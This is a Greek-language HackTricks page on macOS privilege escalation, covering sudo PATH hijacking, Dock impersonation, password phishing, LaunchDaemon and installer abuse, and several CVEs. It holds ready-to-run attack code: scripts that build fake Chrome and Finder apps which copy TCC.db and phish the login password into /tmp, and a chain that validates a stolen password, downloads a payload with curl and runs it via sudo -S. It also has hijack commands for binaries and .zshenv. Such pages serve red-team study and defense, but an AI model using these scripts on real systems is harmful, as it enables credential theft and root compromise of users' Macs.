# Κλιμάκωση προνομίων macOS

{{#include ../../banners/hacktricks-training.md}}

## Κλιμάκωση προνομίων TCC

Αν ψάχνετε πληροφορίες για την κλιμάκωση προνομίων TCC, μεταβείτε εδώ:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Πολλές τεχνικές κλιμάκωσης προνομίων που επηρεάζουν το Linux ή άλλα συστήματα τύπου Unix εφαρμόζονται και στο macOS. Δείτε:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Αλληλεπίδραση με τον χρήστη

### Sudo Hijacking

Μπορείτε να βρείτε την αρχική [τεχνική Sudo Hijacking στην ανάρτηση για την κλιμάκωση προνομίων στο Linux](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Ωστόσο, το macOS **διατηρεί** το **`PATH`** του χρήστη όταν εκείνος εκτελεί το **`sudo`**. Αυτό σημαίνει ότι ένας άλλος τρόπος για να πραγματοποιηθεί αυτή η επίθεση είναι να **κάνετε hijack άλλα δυαδικά αρχεία** που το θύμα θα εκτελέσει κατά την **εκτέλεση του sudo:**

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

Σημειώστε ότι είναι πολύ πιθανό ένας χρήστης που χρησιμοποιεί το terminal να έχει εγκατεστημένο το **Homebrew**. Επομένως, είναι δυνατό να γίνει hijack binaries στο **`/opt/homebrew/bin`**.

### Dock Impersonation

Χρησιμοποιώντας λίγο **social engineering**, μπορείτε να **παριστάνετε, για παράδειγμα, το Google Chrome** μέσα στο dock και να εκτελείτε στην πραγματικότητα το δικό σας script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Μερικές προτάσεις:

- Ελέγξτε αν υπάρχει Chrome στο Dock και, αν υπάρχει, **αφαιρέστε** αυτή την καταχώριση και **προσθέστε** την **ψεύτικη καταχώριση Chrome στην ίδια θέση** στον πίνακα του Dock.

<details>
<summary>Script πλαστοπροσωπίας του Chrome στο Dock</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Μερικές προτάσεις:

- **Δεν μπορείτε να αφαιρέσετε το Finder από το Dock**, οπότε αν πρόκειται να το προσθέσετε στο Dock, μπορείτε να τοποθετήσετε το ψεύτικο Finder ακριβώς δίπλα στο πραγματικό. Για να το κάνετε αυτό, πρέπει να **προσθέσετε την καταχώριση του ψεύτικου Finder στην αρχή του array του Dock**.
- Μια άλλη επιλογή είναι να μην το τοποθετήσετε στο Dock και απλώς να το ανοίξετε· το «Finder ζητά να ελέγξει το Finder» δεν είναι και τόσο παράξενο.
- Μια άλλη επιλογή για **escalate to root χωρίς να ζητηθεί** ο κωδικός πρόσβασης, αλλά με ένα απαίσιο παράθυρο, είναι να κάνετε το Finder να ζητήσει πραγματικά τον κωδικό πρόσβασης για να εκτελέσει μια ενέργεια με αυξημένα δικαιώματα:
  - Ζητήστε από το Finder να αντιγράψει ένα νέο αρχείο **`sudo`** στο **`/etc/pam.d`** (το μήνυμα που ζητά τον κωδικό πρόσβασης θα αναφέρει ότι «το Finder θέλει να αντιγράψει το sudo»).
  - Ζητήστε από το Finder να αντιγράψει ένα νέο **Authorization Plugin** (Μπορείτε να ορίσετε εσείς το όνομα του αρχείου, ώστε το μήνυμα που ζητά τον κωδικό πρόσβασης να αναφέρει ότι «το Finder θέλει να αντιγράψει το Finder.bundle»).

<details>
<summary>Σενάριο πλαστοπροσωπίας του Finder στο Dock</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### Phishing μέσω προτροπής κωδικού πρόσβασης + επαναχρησιμοποίηση sudo

Το malware συχνά εκμεταλλεύεται την αλληλεπίδραση με τον χρήστη για να **υποκλέψει έναν κωδικό πρόσβασης που επιτρέπει τη χρήση sudo** και να τον επαναχρησιμοποιήσει προγραμματιστικά. Μια συνηθισμένη ροή:

1. Εντοπισμός του συνδεδεμένου χρήστη με `whoami`.
2. **Επανάληψη των προτροπών κωδικού πρόσβασης** μέχρι η εντολή `dscl . -authonly "$user" "$pw"` να επιστρέψει επιτυχία.
3. Αποθήκευση προσωρινά του διαπιστευτηρίου (π.χ., στο `/tmp/.pass`) και εκτέλεση ενεργειών με αυξημένα δικαιώματα μέσω `sudo -S` (κωδικός πρόσβασης μέσω stdin).

Παράδειγμα ελάχιστης αλυσίδας:

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

Ο κλεμμένος κωδικός πρόσβασης μπορεί στη συνέχεια να χρησιμοποιηθεί ξανά για **εκκαθάριση του Gatekeeper quarantine με `xattr -c`**, αντιγραφή LaunchDaemons ή άλλων προνομιούχων αρχείων και εκτέλεση πρόσθετων σταδίων χωρίς αλληλεπίδραση.<sup>[[1]](#references)</sup>

#### Επικύρωση καταγεγραμμένων κωδικών πρόσβασης μέσω PAM

Ένα prompt ασφαλούς κειμένου που μοιάζει εγγενές μπορεί να συλλέξει έναν πιθανό κωδικό πρόσβασης λογαριασμού και να τον επικυρώσει εντός της διεργασίας μέσω PAM, αντί να εκκινήσει τα `dscl`, `security` ή `osascript`. Ο κώδικας καλών ξεκινά μια συναλλαγή PAM με το `pam_start`, παρέχει τον πιθανό κωδικό μέσω callback συνομιλίας, καλεί το `pam_authenticate` και κλείνει τη συναλλαγή με το `pam_end`. Ένας αποτυχημένος έλεγχος μπορεί να επιστρέψει στο πεδίο κωδικού πρόσβασης· ένας επιτυχημένος έλεγχος επιβεβαιώνει τον κωδικό πρόσβασης χωρίς να εκκινήσει ξεχωριστή διεργασία επαλήθευσης. Η αυθεντικοποίηση PAM από μόνη της **δεν** αναβαθμίζει τα δικαιώματα του καλούντος ούτε εξουσιοδοτεί προνομιούχες λειτουργίες.<sup>[[9]](#references)[[10]](#references)</sup>

Αν οι κωδικοί πρόσβασης σύνδεσης και Keychain είναι ίδιοι, ο καταγεγραμμένος κωδικός πρόσβασης μπορεί επίσης να χρησιμοποιηθεί για λειτουργίες που απαιτούν τον τρέχοντα κωδικό πρόσβασης Keychain· δείτε [Keychain ACL and partition-list constraints](../macos-red-teaming/macos-keychain.md).<sup>[[10]](#references)</sup>

## Νεότερα ειδικά για το macOS vectors (2023–2026)

### Το παρωχημένο `AuthorizationExecuteWithPrivileges` εξακολουθεί να λειτουργεί

Το `AuthorizationExecuteWithPrivileges` καταργήθηκε ως παρωχημένο στην έκδοση 10.7, αλλά **εξακολουθεί να λειτουργεί στις Sonoma/Sequoia**. Πολλά εμπορικά προγράμματα ενημέρωσης καλούν το `/usr/libexec/security_authtrampoline` με μη έμπιστη διαδρομή. Αν το δυαδικό αρχείο-στόχος είναι εγγράψιμο από τον χρήστη, μπορείς να εγκαταστήσεις ένα trojan και να αξιοποιήσεις το νόμιμο prompt:

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

Συνδυάστε το με τα **παραπάνω τεχνάσματα παραπλάνησης** για να εμφανίσετε ένα πειστικό παράθυρο διαλόγου κωδικού πρόσβασης.


### Διαλογή προνομιούχου helper / XPC

Πολλά σύγχρονα privescs τρίτων στο macOS ακολουθούν το ίδιο μοτίβο: ένα **root LaunchDaemon** εκθέτει μια **υπηρεσία Mach/XPC** από το **`/Library/PrivilegedHelperTools`**, και έπειτα ο helper είτε **δεν επικυρώνει τον client**, είτε τον επικυρώνει **πολύ αργά** (PID race), είτε εκθέτει μια **root μέθοδο** που χρησιμοποιεί μια **διαδρομή/ένα script που ελέγχει ο χρήστης**. Αυτή είναι η κατηγορία σφαλμάτων πίσω από πολλά πρόσφατα σφάλματα helper σε VPN clients, game launchers και updaters.<sup>[[2]](#references)</sup>

Γρήγορη λίστα ελέγχου διαλογής:

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

Δώστε ιδιαίτερη προσοχή σε helpers που:

- συνεχίζουν να δέχονται αιτήματα **μετά την απεγκατάσταση**, επειδή το job παρέμεινε φορτωμένο στο `launchd`
- εκτελούν scripts ή διαβάζουν ρυθμίσεις από το **`/Applications/...`** ή άλλες διαδρομές στις οποίες μπορούν να γράψουν μη-root χρήστες
- βασίζονται σε επικύρωση peer με βάση μόνο το **PID** ή το **bundle-id**, η οποία μπορεί να είναι ευάλωτη σε race conditions

Για περισσότερες λεπτομέρειες σχετικά με bugs στην εξουσιοδότηση helpers, δείτε [αυτή τη σελίδα](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Κληρονόμηση περιβάλλοντος script του PackageKit (CVE-2024-27822)

Μέχρι να το διορθώσει η Apple στα **Sonoma 14.5**, **Ventura 13.6.7** και **Monterey 12.7.5**, οι εγκαταστάσεις που ξεκινούσε ο χρήστης μέσω των **`Installer.app`** / **`PackageKit.framework`** μπορούσαν να εκτελέσουν scripts PKG ως root μέσα στο περιβάλλον του τρέχοντος χρήστη. Αυτό σημαίνει ότι ένα package που χρησιμοποιούσε **`#!/bin/zsh`** θα φόρτωνε το **`~/.zshenv`** του attacker και θα το εκτελούσε ως root όταν το θύμα εγκαθιστούσε το package.<sup>[[3]](#references)</sup>

Αυτό είναι ιδιαίτερα ενδιαφέρον ως **logic bomb**: χρειάζεστε μόνο ένα foothold στον λογαριασμό του χρήστη και ένα αρχείο εκκίνησης shell στο οποίο μπορείτε να γράψετε. Έπειτα, περιμένετε μέχρι ο χρήστης να εκτελέσει οποιοδήποτε ευάλωτο installer που βασίζεται στο **zsh**. Αυτό γενικά **δεν** ισχύει για deployments μέσω **MDM/Munki**, επειδή αυτά εκτελούνται μέσα στο περιβάλλον του root χρήστη.<sup>[[3]](#references)</sup>

```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```

Αν θέλετε να εμβαθύνετε στην κατάχρηση ειδικά των installers, δείτε και [αυτή τη σελίδα](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Σύγκρουση προορισμού Installer μέσω `.localized`

Ορισμένοι installers τρίτων κατασκευαστών καταχωρίζουν ένα root LaunchDaemon, του οποίου το εκτελέσιμο αρχείο παραπέμπει σε μια σταθερή διαδρομή μέσα στο `/Applications/Target.app`. Αν ένας attacker μπορεί να δημιουργήσει πρώτος αυτό το bundle με **διαφορετικό bundle identifier**, ο Installer ενδέχεται να διατηρήσει το δόλωμα και να τοποθετήσει την πραγματική εφαρμογή στο `/Applications/Target.localized/Target.app`. Ο daemon εξακολουθεί να δείχνει στην αρχική διαδρομή. Επομένως, ένα εκτελέσιμο αρχείο που ελέγχει ο attacker και βρίσκεται μέσα στο bundle-δόλωμα μπορεί αργότερα να εκτελεστεί ως root.<sup>[[8]](#references)</sup>

Οι σημαντικές προϋποθέσεις είναι οι εξής:<sup>[[8]](#references)</sup>

1. Ο attacker μπορεί να δημιουργήσει ή να ελέγξει την αναμενόμενη διαδρομή της εφαρμογής.
2. Το package δεν αφαιρεί το bundle που προκαλεί τη σύγκρουση.
3. Το προνομιούχο job χρησιμοποιεί μια hard-coded διαδρομή μέσα σε αυτό το bundle.
4. Ο χρήστης ή μια ροή εργασίας MDM εγκαθιστά το package και καταχωρίζει το job.

Αναζητήστε bundles που έχουν μετακινηθεί και, στη συνέχεια, εξετάστε τους στόχους των LaunchDaemon με τον βρόχο απαρίθμησης στην επόμενη ενότητα:<sup>[[8]](#references)</sup>

```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```

Ένα ασφαλέστερο installer επιλύει την τελική τοποθεσία του bundle και διατηρεί τα εκτελέσιμα με προνόμια σε τοποθεσία ιδιοκτησίας του root, όπως η `/Library/PrivilegedHelperTools`. Θα πρέπει επίσης να επαληθεύει την ιδιοκτησία και την υπογραφή κώδικα πριν από την καταχώριση ή την εκκίνηση του job.<sup>[[8]](#references)</sup>

### Υφαρπαγή στόχου LaunchDaemon με δυνατότητα εγγραφής

Ένα plist LaunchDaemon μπορεί να είναι ιδιοκτησίας του root, ενώ το `Program` ή η πρώτη καταχώριση του `ProgramArguments` να δείχνει σε κατάλογο στον οποίο μπορεί να γράψει ο χρήστης. Ελέγξτε **ολόκληρη τη διαδρομή**, όχι μόνο τα δικαιώματα του εκτελέσιμου. Αν ο γονικός κατάλογος επιτρέπει εγγραφή, ένας attacker μπορεί να μετονομάσει ένα εκτελέσιμο ιδιοκτησίας του root και να δημιουργήσει ένα υποκατάστατο στην ίδια διαδρομή. Το υποκατάστατο εκτελείται ως root την επόμενη φορά που ξεκινά το job. Αρκεί μια επανεκκίνηση ή μια κανονική επανεκκίνηση της υπηρεσίας. Ο attacker δεν χρειάζεται άδεια να εκτελέσει `launchctl bootstrap` στον τομέα system.<sup>[[7]](#references)</sup>

Απαριθμήστε πρώτα κάθε στόχο και τον άμεσο γονικό του κατάλογο:<sup>[[7]](#references)</sup>

```bash
for p in /Library/LaunchDaemons/*.plist; do
  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] ||
    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] || continue
  printf '\n%s -> %s\n' "$p" "$target"
  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```

Όταν το αρχείο ή ο γονικός του κατάλογος είναι εγγράψιμος, διατήρησε το αρχικό binary και αντικατάστησε τη διαδρομή με ένα εκτελέσιμο payload. Έπειτα, περίμενε να επανεκκινηθεί ο daemon που έχει ήδη φορτωθεί.<sup>[[7]](#references)</sup>

```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```

### XNU SMR race στον δείκτη credentials (CVE-2025-24118)

Η ευάλωτη διαδρομή `kauth_cred_proc_update` ενημέρωνε το `proc_ro.p_ucred` μέσω του μη ατομικού API `zalloc_ro_mut`, ενώ οι αναγνώστες SMR φόρτωναν τον δείκτη χωρίς κλείδωμα. Το δημόσιο trigger χρησιμοποιεί ένα ειδικά προετοιμασμένο δυαδικό αρχείο setgid. Ένα thread εναλλάσσεται μεταξύ των πραγματικών και των ενεργών group ID του, ενώ ένα άλλο thread καλεί επανειλημμένα ένα syscall όπως το `getgid()`.<sup>[[4]](#references)</sup>

```c
// Writer thread inside a setgid binary
while (1) {
    setgid(real_gid);
    setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```

Αντιμετωπίστε το ως **race primitive**, όχι ως έτοιμο root exploit. Το δημοσιευμένο PoC δείχνει έναν αλλοιωμένο δείκτη διαπιστευτηρίων. Συνήθως καταλήγει σε kernel panic. Ο ερευνητής αναπαρήγαγε την αλλοίωση μόνο σε Intel και δεν έδειξε πώς να ελέγχεται ντετερμινιστικά το αντικείμενο διαπιστευτηρίων που προκύπτει. Η Apple άλλαξε την ενημέρωση σε atomic pointer exchange στο macOS 15.3.<sup>[[4]](#references)</sup>

### Παράκαμψη SIP μέσω του Migration Assistant ("Migraine", CVE-2023-32369)

Ακόμα κι αν έχετε ήδη root, το SIP εξακολουθεί να εμποδίζει τις εγγραφές σε τοποθεσίες συστήματος. Το bug **Migraine** εκμεταλλεύεται το entitlement του Migration Assistant `com.apple.rootless.install.heritable` για να εκκινήσει μια θυγατρική διεργασία που κληρονομεί την παράκαμψη SIP και αντικαθιστά προστατευμένες διαδρομές (π.χ., `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> Η αλυσίδα:

1. Αποκτήστε root σε ένα ενεργό σύστημα.
2. Ενεργοποιήστε το `systemmigrationd` με ειδικά διαμορφωμένη κατάσταση ώστε να εκτελέσει ένα δυαδικό αρχείο που ελέγχει ο attacker.
3. Χρησιμοποιήστε το κληρονομημένο entitlement για να τροποποιήσετε αρχεία που προστατεύονται από το SIP, διατηρώντας τις αλλαγές ακόμα και μετά την επανεκκίνηση.

### Λαθραία μεταφορά εκφράσεων NSPredicate/XPC (κατηγορία bug CVE-2023-23530/23531)

Πολλοί Apple daemons δέχονται αντικείμενα **NSPredicate** μέσω XPC και επικυρώνουν μόνο το πεδίο `expressionType`, το οποίο ελέγχεται από τον attacker. Δημιουργώντας ένα predicate που αξιολογεί αυθαίρετους selectors, μπορείτε να επιτύχετε **εκτέλεση κώδικα σε root/system XPC services** (π.χ., `coreduetd`, `contextstored`). Σε συνδυασμό με αρχική παράκαμψη του app sandbox, αυτό παρέχει **κλιμάκωση προνομίων χωρίς προτροπές προς τον χρήστη**. Αναζητήστε XPC endpoints που κάνουν deserialize predicates και δεν διαθέτουν robust visitor.<sup>[[6]](#references)</sup>

## TCC - Κλιμάκωση προνομίων root

### CVE-2020-9771 - Παράκαμψη TCC και κλιμάκωση προνομίων μέσω του mount_apfs

**Οποιοσδήποτε χρήστης** (ακόμα και χωρίς προνόμια) μπορεί να δημιουργήσει και να προσαρτήσει ένα snapshot του Time Machine με `-o noowners` και να **αποκτήσει πρόσβαση σε ΟΛΑ τα αρχεία** του snapshot, παρακάμπτοντας τους ελέγχους ιδιοκτησίας στο ενεργό volume. Το μόνο απαιτούμενο προνόμιο είναι η εφαρμογή που χρησιμοποιείται (όπως το `Terminal`) να έχει **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Οι εντολές και η πλήρης επεξήγηση βρίσκονται στη σελίδα παρακάμψεων TCC:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Ευαίσθητες πληροφορίες

Αυτό μπορεί να φανεί χρήσιμο για την κλιμάκωση προνομίων:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [Pentest Partners - 2025, η χρονιά του Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: Κλιμάκωση τοπικών προνομίων μέσω του AWS Client VPN για macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: Κλιμάκωση προνομίων μέσω του macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft "Migraine": Παράκαμψη SIP (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - Μια νέα κατηγορία bug κλιμάκωσης προνομίων σε macOS και iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [Παραβίαση LaunchDaemon: κλιμάκωση προνομίων και persistence μέσω μη ασφαλών δικαιωμάτων φακέλων](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [macOS LPE μέσω του καταλόγου .localized](https://theevilbit.github.io/posts/localized/)
- [9] [Jamf Threat Labs - PamStealer: malware για macOS που μεταμφιέζεται σε εφαρμογή διαχείρισης clipboard](https://www.jamf.com/blog/pamstealer-macos-infostealer-applescript-rust/)
- [10] [Kaspersky Securelist - Το MacSync στο μικροσκόπιο](https://securelist.com/macsync-new-version/121383/)
